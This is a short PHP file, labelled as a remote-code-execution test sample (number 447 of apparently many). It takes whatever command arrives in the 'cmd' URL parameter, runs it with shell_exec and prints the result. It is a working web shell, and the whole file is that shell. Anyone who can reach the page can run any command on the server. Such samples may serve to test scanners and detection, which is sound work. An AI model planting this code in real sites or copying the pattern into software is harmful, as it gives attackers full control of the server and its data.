<?php
// RCE test variation #447
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>